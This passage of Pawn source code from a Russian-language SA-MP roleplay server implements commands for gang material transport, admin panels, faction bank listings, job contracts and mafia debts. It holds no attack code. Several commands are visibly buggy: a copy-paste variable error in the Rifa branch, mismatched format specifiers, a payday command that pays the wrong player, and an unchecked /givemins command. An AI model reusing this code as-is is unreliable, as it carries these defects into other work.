			SCM(playerid, -1, " Введите: /materials [значение]");
			return true;
		}
		if(strcmp(x_nr, "buy",true) == 0)
		{
			if(IsAMafia(playerid) && PlayerInfo[playerid][pRank] >= 9)
			{
				format(string, 128, "Вы действительно хотите купить 50000 материалов,\nв общак банды за 500000 вирт?");
				ShowPlayerDialogEx(playerid,9298,DIALOG_STYLE_MSGBOX, "Покупка материалов",string, "Да", "Отмена");
				return true;
			}
		}
		else if(strcmp(x_nr, "load",true) == 0)
		{
			new tmpcar = GetNearestVehicle(playerid);
			if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 482) return SCM(playerid,COLOR_GREY, " Вы не в фургоне!");
			if(!IsATerra(playerid)) return SCM(playerid, COLOR_GRAD1, " Вы должны находится на своей базе!");
			if(!IsAGang(playerid)) return SCM(playerid,COLOR_GREY, " Вы не бандит");
			if(ballasmatbi <= 0) return SCM(playerid, COLOR_GREY, " На складе недостаточно материалов");
			if(PlayerInfo[playerid][pRank] < 8)return SCM(playerid,COLOR_GRAD1," Доступно только с 8 ранга!");
			switch(PlayerInfo[playerid][pMember])
			{
			case 12:
				{
					if(Furi[tmpcar-matsfura[0]][gBallas] > 0 && Furi[tmpcar-matsfura[0]][gBallas] < maxMats[gBallas] && ballasmatbi > maxMats[gBallas])
					{
						kolvovfure = maxMats[gBallas] - Furi[tmpcar-matsfura[0]][gBallas];
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PlayerInfo[playerid][pName], kolvovfure);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfura[0]][gBallas] += kolvovfure;
						ballasmatbi -= kolvovfure;
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
					else if(Furi[tmpcar-matsfura[0]][gBallas] == maxMats[gBallas]) return SCM(playerid, COLOR_GRAD1, " Фургон полн");
					else if(Furi[tmpcar-matsfura[0]][gBallas] == 0 && ballasmatbi > maxMats[gBallas])
					{
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PlayerInfo[playerid][pName], maxMats[gBallas]);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfura[0]][gBallas] += maxMats[gBallas];
						ballasmatbi -= maxMats[gBallas];
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
					else if(ballasmatbi < maxMats[gBallas])
					{
						kolvovsklade = ballasmatbi;
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PlayerInfo[playerid][pName], kolvovsklade);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfura[0]][gBallas] += kolvovsklade;
						ballasmatbi -= kolvovsklade;
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
				}
			case 13:
				{
					if(Furi[tmpcar-matsfuravagos[0]][gVagos] > 0 && Furi[tmpcar-matsfuravagos[0]][gVagos] < maxMats[gVagos] && vagosmatbi > maxMats[gVagos])
					{
						kolvovfure = maxMats[gVagos] - Furi[tmpcar-matsfuravagos[0]][gVagos];
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PlayerInfo[playerid][pName], kolvovfure);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfuravagos[0]][gVagos] += kolvovfure;
						vagosmatbi -= kolvovfure;
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
					else if(Furi[tmpcar-matsfuravagos[0]][gVagos] == maxMats[gVagos]) return SCM(playerid, COLOR_GRAD1, " Фургон полн");
					else if(Furi[tmpcar-matsfuravagos[0]][gVagos] == 0 && vagosmatbi > maxMats[gVagos])
					{
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PlayerInfo[playerid][pName], maxMats[gVagos]);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfuravagos[0]][gVagos] += maxMats[gVagos];
						vagosmatbi -= maxMats[gVagos];
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
					else if(vagosmatbi < maxMats[gVagos])
					{
						kolvovsklade = vagosmatbi;
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PlayerInfo[playerid][pName], kolvovsklade);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfuravagos[0]][gVagos] += kolvovsklade;
						vagosmatbi -= kolvovsklade;
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
				}
			case 15:
				{
					if(Furi[tmpcar-matsfuragrove[0]][gGrove] > 0 && Furi[tmpcar-matsfuragrove[0]][gGrove] < maxMats[gGrove] && groovmatbi > maxMats[gGrove])
					{
						kolvovfure = maxMats[gGrove] - Furi[tmpcar-matsfuragrove[0]][gGrove];
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PlayerInfo[playerid][pName], kolvovfure);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfuragrove[0]][gGrove] += kolvovfure;
						groovmatbi -= kolvovfure;
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
					else if(Furi[tmpcar-matsfuragrove[0]][gGrove] == maxMats[gGrove]) return SCM(playerid, COLOR_GRAD1, " Фургон полн");
					else if(Furi[tmpcar-matsfuragrove[0]][gGrove] == 0 && groovmatbi > maxMats[gGrove])
					{
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PlayerInfo[playerid][pName], maxMats[gGrove]);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfuragrove[0]][gGrove] += maxMats[gGrove];
						groovmatbi -= maxMats[gGrove];
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
					else if(groovmatbi < maxMats[gGrove])
					{
						kolvovsklade = groovmatbi;
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PlayerInfo[playerid][pName], kolvovsklade);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfuragrove[0]][gGrove] += kolvovsklade;
						groovmatbi -= kolvovsklade;
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
				}
			case 17:
				{
					if(Furi[tmpcar-matsfuraactek[0]][gAztek] > 0 && Furi[tmpcar-matsfuraactek[0]][gAztek] < maxMats[gAztek] && aztekmatbi > maxMats[gAztek])
					{
						kolvovfure = maxMats[gAztek] - Furi[tmpcar-matsfuraactek[0]][gAztek];
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PlayerInfo[playerid][pName], kolvovfure);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfuraactek[0]][gAztek] += kolvovfure;
						aztekmatbi -= kolvovfure;
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
					else if(Furi[tmpcar-matsfuraactek[0]][gAztek] == maxMats[gAztek]) return SCM(playerid, COLOR_GRAD1, " Фургон полн");
					else if(Furi[tmpcar-matsfuraactek[0]][gAztek] == 0 && aztekmatbi > maxMats[gAztek])
					{
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PlayerInfo[playerid][pName], maxMats[gAztek]);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfuraactek[0]][gAztek] += maxMats[gAztek];
						aztekmatbi -= maxMats[gAztek];
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
					else if(aztekmatbi < maxMats[gAztek])
					{
						kolvovsklade = aztekmatbi;
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PlayerInfo[playerid][pName], kolvovsklade);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfuraactek[0]][gAztek] += kolvovsklade;
						aztekmatbi -= kolvovsklade;
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
				}
			case 18:
				{
					if(Furi[tmpcar-matsfurarifa[0]][gRifa] > 0 && Furi[tmpcar-matsfurarifa[0]][gRifa] < maxMats[gRifa] && rifamatbi > maxMats[gRifa])
					{
						kolvovfure = maxMats[gRifa] - Furi[tmpcar-matsfurarifa[0]][gRifa];
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PlayerInfo[playerid][pName], kolvovfure);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfurarifa[0]][gRifa] += kolvovfure;
						rifamatbi -= kolvovfure;
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
					else if(Furi[tmpcar-matsfurarifa[0]][gRifa] == maxMats[gRifa]) return SCM(playerid, COLOR_GRAD1, " Фургон полн");
					else if(Furi[tmpcar-matsfurarifa[0]][gRifa] == 0 && rifamatbi > maxMats[gRifa])
					{
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PlayerInfo[playerid][pName], maxMats[gRifa]);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfurarifa[0]][gRifa] += maxMats[gRifa];
						rifamatbi -= maxMats[gRifa];
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
					else if(rifamatbi < maxMats[gRifa])
					{
						kolvovsklade = aztekmatbi;
						format(string, 128, "% s загрузил(а) %i материалов в фургон", PlayerInfo[playerid][pName], kolvovsklade);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfurarifa[0]][gRifa] += kolvovsklade;
						rifamatbi -= kolvovsklade;
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
				}
			}
		}
		else if(strcmp(x_nr, "put",true) == 0)
		{
			new tmpcar = GetNearestVehicle(playerid);
			if(GetVehicleModel(GetNearestVehicle(playerid)) != 482) return SCM(playerid,COLOR_GREY, " Вы не в фургоне/Около фургона!");
			switch(PlayerInfo[playerid][pMember])
			{
			case 12:
				{
					if(usemats[playerid] == 0)
					{
						SCM(playerid,COLOR_GRAD1, " У вас нет материалов с собой");
						format(string, 128, " Материалы в фургоне: %i/%i", Furi[tmpcar-matsfura[0]][gBallas], maxMats[gBallas]);
						SCM(playerid, TEAM_GROVE_COLOR, string);
						return true;
					}
					if(Furi[tmpcar-matsfura[0]][gBallas] >= maxMats[gBallas]) return SCM(playerid,COLOR_GRAD1, " Фургон заполнен");
					SCM(playerid, -1, " Вы положили в фургон 250 материалов");
					Furi[tmpcar-matsfura[0]][gBallas] += 250;
					usemats[playerid] = 0;
					RemovePlayerAttachedObject(playerid, 1);
					format(string, 128, " Материалы в фургоне: %i/%i", Furi[tmpcar-matsfura[0]][gBallas], maxMats[gBallas]);
					SCM(playerid, TEAM_GROVE_COLOR, string);
					SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
				}
			case 13:
				{
					if(usemats[playerid] == 0)
					{
						SCM(playerid,COLOR_GRAD1, " У вас нет материалов с собой");
						format(string, 128, " Материалы: %i/%i", Furi[tmpcar-matsfuravagos[0]][gVagos], maxMats[gVagos]);
						SCM(playerid, TEAM_GROVE_COLOR, string);
						return true;
					}
					if(Furi[tmpcar-matsfuravagos[0]][gVagos] >= maxMats[gVagos]) return SCM(playerid,COLOR_GRAD1, " Фургон заполнен");
					SCM(playerid, -1, " Вы положили в фургон 250 материалов");
					Furi[tmpcar-matsfuravagos[0]][gVagos] += 250;
					usemats[playerid] = 0;
					RemovePlayerAttachedObject(playerid, 1);
					format(string, 128, " Материалы: %i/%i", Furi[tmpcar-matsfuravagos[0]][gVagos], maxMats[gVagos]);
					SCM(playerid, TEAM_GROVE_COLOR, string);
					SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
				}
			case 15:
				{
					if(usemats[playerid] == 0)
					{
						SCM(playerid,COLOR_GRAD1, " У вас нет материалов с собой");
						format(string, 128, " Материалы: %i/%i", Furi[tmpcar-matsfuragrove[0]][gGrove], maxMats[gGrove]);
						SCM(playerid, TEAM_GROVE_COLOR, string);
						return true;
					}
					if(Furi[tmpcar-matsfuragrove[0]][gGrove] >= maxMats[gGrove]) return SCM(playerid,COLOR_GRAD1, " Фургон заполнен");
					SCM(playerid, -1, " Вы положили в фургон 250 материалов");
					Furi[tmpcar-matsfuragrove[0]][gGrove] += 250;
					usemats[playerid] = 0;
					RemovePlayerAttachedObject(playerid, 1);
					format(string, 128, " Материалы: %i/%i", Furi[tmpcar-matsfuragrove[0]][gGrove], maxMats[gGrove]);
					SCM(playerid, TEAM_GROVE_COLOR, string);
					SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
				}
			case 17:
				{
					if(usemats[playerid] == 0)
					{
						SCM(playerid,COLOR_GRAD1, " У вас нет материалов с собой");
						format(string, 128, " Материалы: %i/%i", Furi[tmpcar-matsfuraactek[0]][gAztek], maxMats[gAztek]);
						SCM(playerid, TEAM_GROVE_COLOR, string);
						return true;
					}
					if(Furi[tmpcar-matsfuraactek[0]][gAztek] >= maxMats[gAztek])return SCM(playerid,COLOR_GRAD1, " Фургон заполнен");
					SCM(playerid, -1, " Вы положили в фургон 250 материалов");
					Furi[tmpcar-matsfuraactek[0]][gAztek] += 250;
					usemats[playerid] = 0;
					RemovePlayerAttachedObject(playerid, 1);
					format(string, 128, " Материалы: %i/%i", Furi[tmpcar-matsfuraactek[0]][gAztek], maxMats[gAztek]);
					SCM(playerid, TEAM_GROVE_COLOR, string);
					SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
				}
			case 18:
				{
					if(usemats[playerid] == 0)
					{
						SCM(playerid,COLOR_GRAD1, " У вас нет материалов с собой");
						format(string, 128, " Материалы: %i/%i", Furi[tmpcar-matsfurarifa[0]][gRifa], maxMats[gRifa]);
						SCM(playerid, TEAM_GROVE_COLOR, string);
						return true;
					}
					if(Furi[tmpcar-matsfurarifa[0]][gRifa] >= maxMats[gRifa])return SCM(playerid,COLOR_GRAD1, " Фургон заполнен");
					SCM(playerid, -1, " Вы положили в фургон 250 материалов");
					Furi[tmpcar-matsfurarifa[0]][gRifa] += 250;
					usemats[playerid] = 0;
					RemovePlayerAttachedObject(playerid, 1);
					format(string, 128, " Материалы: %i/%i", Furi[tmpcar-matsfurarifa[0]][gRifa], maxMats[gRifa]);
					SCM(playerid, TEAM_GROVE_COLOR, string);
					SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
				}
			}
		}
		else if(strcmp(x_nr, "get",true) == 0)
		{
			if(IsAGang(playerid))
			{
				if(PlayerToPoint(10.0,playerid,-1290.9072,501.4489,11.1953))
				{
					if(armmatsf < 250)return SCM(playerid,COLOR_GRAD1, " Склад армии пуст");
					if(usemats[playerid] != 0) return SCM(playerid,COLOR_GRAD1, " Вы не можете взять больше");
					SCM(playerid, 0x6495EDFF, " Вы взяли 250 материалов со склада армии");
					SCM(playerid, -1, " Несите ящик в грузовик, используйте /materials put, чтобы положить материалы в фургон");
					SetPlayerSpecialAction (playerid, SPECIAL_ACTION_CARRY);
					SetPlayerAttachedObject(playerid, 1 , 2358, 1,0.11,0.36,0.0,0.0,90.0);
					usemats[playerid] = 1;
					armmatsf -= 250;
				}
				if(PlayerToPoint(2.0,playerid,2729.3267,-2451.5051,17.5937))
				{
					if(lsamatbi < 250)return SCM(playerid,COLOR_GRAD1, " Склад армии пуст");
					if(usemats[playerid] != 0) return SCM(playerid,COLOR_GRAD1, " Вы не можете взять больше");
					SCM(playerid, 0x6495EDFF, " Вы взяли 250 материалов со склада армии");
					SCM(playerid, -1, " Несите ящик в грузовик, используйте /materials put, чтобы положить материалы в фургон");
					SetPlayerSpecialAction (playerid, SPECIAL_ACTION_CARRY);
					SetPlayerAttachedObject(playerid, 1 , 2358, 1,0.11,0.36,0.0,0.0,90.0);
					usemats[playerid] = 2;
					lsamatbi -= 250;
				}
				if(PlayerToPoint(10.0,playerid,316.8127,-167.5395,999.5938) && GetPlayerVirtualWorld(playerid) == 0)
				{
					if(armmatbi < 250)return SCM(playerid,COLOR_GRAD1, " Склад армии пуст");
					if(usemats[playerid] != 0) return SCM(playerid,COLOR_GRAD1, " Вы не можете взять больше");
					SCM(playerid, 0x6495EDFF, " Вы взяли 250 материалов со склада армии");
					SCM(playerid, -1, " Несите ящик в грузовик, используйте /materials put, чтобы положить материалы в фургон");
					SetPlayerSpecialAction (playerid, SPECIAL_ACTION_CARRY);
					SetPlayerAttachedObject(playerid, 1 , 2358, 1,0.11,0.36,0.0,0.0,90.0);
					usemats[playerid] = 3;
					armmatbi -= 250;
					new strings1[50];
					format(strings1,sizeof(strings1), "{33AA33}Склад армии ЛВ: {FFFFFF}%i", armmatbi);
					UpdateDynamic3DTextLabelText(LvaLable, 0xFFFF00FF, strings1);
				}
			}
		}
	}
	return true;
}
CMD:gettax(playerid, params[])
{
	if(PlayerInfo[playerid][pMember] == 7)
	{
		format(YCMDstr, sizeof(YCMDstr), " В казне: %i вирт", FracBank[0][fKazna]);
		SCM(playerid, -1, YCMDstr);
	}
	return true;
}
CMD:apanel(playerid)
{
	if(!dostup[playerid]) return true;
	if(PlayerInfo[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
    ShowPlayerDialogEx(playerid, 9999, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Информация | {AE433D}Админ Панель",
    "Функция\t\t\tПодробнее\n[0] Developer Panel\t\t\t{C9C9C9}Панель основателя\n[1] Admins\t\t\t{C9C9C9}Администрация Online\n[2] Fraction Bank\t\t\t{C9C9C9}Баланс организаций\n[3] Leaders\t\t\t{C9C9C9}Лидеры организации онлайн\n[4] Cheaters\t\t\t{C9C9C9}Игроки с собейтом",
    "Далее", "Закрыть");
	return true;
}
CMD:lidbalance(playerid, params[])
{
	if(!dostup[playerid]) return true;
	if(PlayerInfo[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	new stringer[1024];
	format(string, 48, "(1) LCN\t\t\t\t %i $\n", MafiaBank[0][nLcn]); strcat(stringer, string);
	format(string, 48, "(2) Yakuza\t\t\t %i $\n", MafiaBank[0][nYakuza]); strcat(stringer, string);
	format(string, 48, "(3) Мэрия\t\t\t %i $\n", FracBank[0][fKazna]); strcat(stringer, string);
	format(string, 48, "(4) SF News\t\t\t %i $\n", FracBank[0][fSfnews]); strcat(stringer, string);
	format(string, 48, "(5) Ballas\t\t\t %i $\n", FracBank[0][fBallas]); strcat(stringer, string);
	format(string, 48, "(6) Vagos\t\t\t %i $\n", FracBank[0][fVagos]); strcat(stringer, string);
	format(string, 48, "(7) RM\t\t\t\t %i $\n",MafiaBank[0][nRm]); strcat(stringer, string);
	format(string, 48, "(7) Grove\t\t\t %i $\n",FracBank[0][fGrove]); strcat(stringer, string);
	format(string, 48, "(8) LS News\t\t\t %i $\n",FracBank[0][fLsnews]); strcat(stringer, string);
	format(string, 48, "(9) Aztec\t\t\t %i $\n",FracBank[0][fAztek]); strcat(stringer, string);
	format(string, 48, "(10) Rifa\t\t\t %i $\n",FracBank[0][fRifa]); strcat(stringer, string);
	format(string, 48, "(12) LV News\t\t\t %i $\n",FracBank[0][fLvnews]); strcat(stringer, string);
	format(string, 48, "(13) Hell's Angels MC\t\t %i $\n",FracBank[0][fHamc]); strcat(stringer, string);
	format(string, 48, "(14) Warlocks MC\t\t %i $\n",FracBank[0][fWmc]); strcat(stringer, string);
	ShowPlayerDialogEx(playerid, 0, DIALOG_STYLE_MSGBOX,"Админ панель",stringer,"Готово", "Отмена");
	return true;
}
CMD:awarehouse(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	format(string, 128, "На складе Зоны 51: %i/300000 материалов", armmatbi);
	SCM(playerid, COLOR_GRAD1, string);
	format(string, 128, "На складе армии Авианосца: %i/300000 материалов", armmatsf);
	SCM(playerid, COLOR_GRAD1, string);
	format(string, 128, "На складе FBI %i материалов", fbimats);
	SCM(playerid, COLOR_GRAD1, string);
	format(string, 128, "На складе LSPD %i/50000 материалов", lspdmatbi);
	SCM(playerid, COLOR_GRAD1, string);
	format(string, 128, "На складе SFPD %i/50000 материалов", sfpdmats);
	SCM(playerid, COLOR_GRAD1, string);
	format(string, 128, "На складе LVPD %i/50000 материалов", lvpdmats);
	SCM(playerid, COLOR_GRAD1, string);
	format(string, 128, "На складе мафии Якудза %i/100000 материалов", yakuzamats);
	SCM(playerid, COLOR_GRAD1, string);
	format(string, 128, "На складе мафии LCN %i/100000 материалов", lcnmats);
	SCM(playerid, COLOR_GRAD1, string);
	format(string, 128, "На складе Русской Мафии %i/100000 материалов", rmmats);
	SCM(playerid, COLOR_GRAD1, string);
	return true;
}
CMD:givemins(playerid)
{
	PlayerInfo[playerid][pMin] = 30;
	return true;
}
CMD:payday(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	PayDay();
	printf("Администратор %s включил PayDay", Name(playerid));
	return true;
}
CMD:gcontract(playerid, params[])
{
	new giveplayerid;
	if(Prorab[playerid] == false) return SCM(playerid,COLOR_RED, " Вы должны переодеться");
	if(!IsPlayerInRangeOfPoint(playerid,10.0,2127.5701,-2275.1938,20.6719)) return SCM(playerid,COLOR_GREY, " Вы должны находиться на заводе");
	if(sscanf(params, "u", giveplayerid)) return SCM(playerid,-1, " Введите: /gcontract [ID].");
	if(giveplayerid == playerid) return SCM(playerid,COLOR_GREY, " Вы указали свой ID");
	if(Prorab[giveplayerid] == true) return SCM(playerid,COLOR_GREY, " Вы не можете заключать контракт с прорабом");
	if(Works[giveplayerid] == true) return SCM(playerid,COLOR_GREY, " Этот игрок уже работает.");
	if(!IsPlayerConnected(giveplayerid)) return SCM(playerid,COLOR_GREY, " Игрок не в сети");
	if(!ProxDetectorS(5.0, playerid, giveplayerid)) return SCM(playerid,COLOR_GREY, " Ошибка. Игрок должен находиться рядом с вами");
	if(JobOffer[giveplayerid] == playerid) return SCM(playerid,COLOR_GREY, " Вы уже предложили игроку контракт.");
	JobOffer[giveplayerid] = playerid;
	format(string, 128, " Вы предложили %s работать под вашим начальством.",PlayerInfo[giveplayerid][pName]);
	SCM(playerid, 0x6495EDFF, string);
	format(string, 128, " %s предложил работать под его начальством (( (/ac)cept gontract ))", PlayerInfo[playerid][pName]);
	SCM(giveplayerid, 0x6495EDFF, string);
	return true;
}
CMD:givepayday(playerid, params[])
{
	new giveplayerid;
	if(Prorab[playerid] == false) return SCM(playerid,COLOR_GREY, " Сначала надо переодеться");
	if(sscanf(params, "u", giveplayerid)) return SCM(playerid,-1, " Введите: /gpayday [ID].");
	if(Employer[giveplayerid] != playerid) return SCM(playerid,COLOR_GREY, " Игрок не работает под вашим начальством");
	if(Works[giveplayerid] == false) return SCM(playerid,COLOR_GREY, " Игрок не на работе.");
	if(JobAmmount[giveplayerid] == 0) return SCM(playerid,COLOR_GREY, " Игрок не перенес ни одного мешка.");
	if(!IsPlayerConnected(giveplayerid)) return SCM(playerid,COLOR_GREY, " Игрок не в сети");
	if(!ProxDetectorS(5.0, playerid, giveplayerid)) return SCM(playerid,COLOR_GREY, " Ошибка. Вы должны находиться рядом с игроком");
	PlayerInfo[playerid][pCash] +=JobAmmount[giveplayerid]*50;
	format(YCMDstr, sizeof(YCMDstr), "~g~+%d$", JobAmmount[playerid]*25);
	GameTextForPlayer(giveplayerid, YCMDstr, 3000, 1);
	SCM(playerid,COLOR_GREEN,"Спасибо за работу, приходите еще!");
	JobAmmount[giveplayerid] = 0; Employer[giveplayerid] = 999;
	return true;
}
CMD:repaydebt(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] == 0) return true;
	if(PlayerInfo[playerid][pDolg] < 50) return SCM(playerid, COLOR_GRAD1, "Не достаточная сумма, для возврата долга!");
	switch(PlayerInfo[playerid][pKrisha])
	{
	case 6:
		{
			SCM(playerid, COLOR_YELLOW, " Долг был возвращён мафии Yakuza!");
			format(YCMDstr, sizeof(YCMDstr), " %s вернул долг в размере %s вирт",PlayerInfo[playerid][pName],PlayerInfo[playerid][pDolg]);
			SendFamilyMessage(6,COLOR_YELLOW2, YCMDstr);
			MafiaBank[0][nYakuza] +=PlayerInfo[playerid][pDolg] ;
			PlayerInfo[playerid][pDolg] = 0;
		}
	case 5:
		{
			if(PlayerInfo[playerid][pDolg] < 50) return SCM(playerid, COLOR_GRAD1, " Не достаточная сумма, для возврата долга!");
			SCM(playerid, COLOR_YELLOW, " Долг был возвращён LCN!");
			format(YCMDstr, sizeof(YCMDstr), " %s вернул долг в размере %s вирт",PlayerInfo[playerid][pName],PlayerInfo[playerid][pDolg]);
			SendFamilyMessage(5,COLOR_YELLOW2, YCMDstr);
			MafiaBank[0][nLcn] +=PlayerInfo[playerid][pDolg];
			PlayerInfo[playerid][pDolg] = 0;
		}
	case 14:
		{
			if(PlayerInfo[playerid][pDolg] < 50) return SCM(playerid, COLOR_GRAD1, " Не достаточная сумма, для возврата долга!");
			SCM(playerid, COLOR_YELLOW, " Долг был возвращён Русской мафии!");
			format(YCMDstr, sizeof(YCMDstr), " %s вернул долг в размере %s вирт",PlayerInfo[playerid][pName],PlayerInfo[playerid][pDolg]);
			SendFamilyMessage(14,COLOR_YELLOW2, YCMDstr);
			MafiaBank[0][nRm] +=PlayerInfo[playerid][pDolg] ;
			PlayerInfo[playerid][pDolg] = 0;
		}
	}
	return true;
}
CMD:mydebts(playerid)
{
	if(PlayerInfo[playerid][pJob] == 0) return true;
	new mafiatext[20];
	if(PlayerInfo[playerid][pKrisha] == 6) { mafiatext = "Yakuza"; }
	else if(PlayerInfo[playerid][pKrisha] == 14) { mafiatext = "RM"; }
	else if(PlayerInfo[playerid][pKrisha] == 5) { mafiatext = "LCN"; }
	else if(PlayerInfo[playerid][pKrisha] == 0) { mafiatext = "Нет"; }
	format(YCMDstr,sizeof(YCMDstr), "Крыша: %s\nДолг: %i вирт",
	mafiatext,PlayerInfo[playerid][pDolg]);
	ShowPlayerDialogEx(playerid,69,DIALOG_STYLE_MSGBOX, "Информация о себе",YCMDstr, "Готово", "");
	return true;
}
CMD:fgstyle(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 6) return true;
	if(!PlayerToPoint(30.0,playerid,768.1588,6.5715,1000.7144)) return 	SCM(playerid, COLOR_GRAD1, " Вы не в спортзале...");
	new listitems[] = " [0] Начать урок по стилю Box\n [1] Начать урок по стилю Kong - Fu\n [2] Начать урок по стилю Kick - Box\n [3] Завершить урок Box\n [4] Завершить урок Kong - Fu\n [5] Завершить урок Kick - Box";
	ShowPlayerDialogEx(playerid, 3439, DIALOG_STYLE_LIST, "Уроки боевых искусств", listitems, "Выбрать", "Отмена");
	return true;
}
CMD:spawn(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	SpawnPlayer(playerid);
	return true;
}
CMD:busdrivers(playerid)
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	new null[13], str[3000];
	foreach(i)
	{
		if(GetPVarInt(i,"TypeBus")) null[GetPVarInt(i,"TypeBus")]++, null[0]++;
	}
	if(!null[0]) return SCM(playerid,COLOR_GREY," Нет водителей автобуса!");
	null[7] = 100 / null[0] * null[1];
	null[8] = 100 / null[0] * null[2];
	null[9] = 100 / null[0] * null[3];
	null[10] = 100 / null[0] * null[4];
	null[11] = 100 / null[0] * null[5];
	null[12] = 100 / null[0] * null[6];
	format(str,sizeof(str),			"Всего водителей: %i человек\n\n\
									ВнутриГородской ЛС\t\t\t\t[%s]%i%% %i человек\n\
									ВнутриГородской СФ\t\t\t\t[%s]%i%% %i человек\n\
									ВнутриГородской ЛВ\t\t\t\t[%s]%i%% %i человек\n", null[0],
	ToDevelopSkills(null[7], 100 - null[7]), null[7], null[1],
	ToDevelopSkills(null[8], 100 - null[8]), null[8], null[2],
	ToDevelopSkills(null[9], 100 - null[9]), null[9], null[3]);
	format(str,sizeof(str),			"%sАвтоВокзал LS << >> Автошкола SF\t\t[%s]%i%% %i человек\n\
									АвтоВокзал LS << >> АвтоВокзал LV\t\t[%s]%i%% %i человек\n\
									АвтоВокзал LS << >> Заводы\t\t\t[%s]%i%% %i человек", str,
	ToDevelopSkills(null[10], 100 - null[10]), null[10], null[4],
	ToDevelopSkills(null[11], 100 - null[11]), null[11], null[5],
	ToDevelopSkills(null[12], 100 - null[12]), null[12], null[6]);
	return ShowPlayerDialogEx(playerid,1100,DIALOG_STYLE_MSGBOX," ",str,"Готово","");
}
CMD:ratingnews(playerid)
{
	radioall = 0;
	new points[3];
	new stringskill[600];
	new ratingGNews = 0;
	new ratingLNews = 0;
